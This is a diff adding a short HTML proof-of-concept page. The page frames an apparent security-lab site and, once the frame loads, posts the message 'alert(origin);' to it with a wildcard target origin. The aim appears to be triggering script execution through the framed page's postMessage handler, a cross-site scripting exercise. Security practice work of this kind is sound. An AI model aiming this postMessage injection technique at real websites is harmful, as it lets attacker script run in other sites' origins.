@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    
+    <iframe id="frm" src="https://85xabpviid.voorivex-lab.online/"></iframe>
+
+    <script>
+        document.getElementById('frm').onload=function(){
+            const iframe=document.getElementById('frm').contentWindow;
+            iframe.postMessage({"isActive":true,"content":"alert(origin);"},'*');  //Sends message to the iframe
+        }
+    </script>
+</body>
+</html>
